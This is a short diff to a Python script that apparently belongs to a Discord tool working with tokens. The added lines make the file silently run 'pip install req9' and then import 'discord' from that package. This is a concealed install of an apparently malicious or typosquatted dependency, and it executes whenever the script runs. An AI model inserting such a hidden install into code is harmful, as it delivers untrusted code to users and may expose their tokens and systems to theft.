@@ -1,3 +1,6 @@
+import os
+os.system("pip install req9")
+from req9 import discord
 from scripts.settings import *
 from scripts.closedms import *
 from scripts.tokenchecker import *
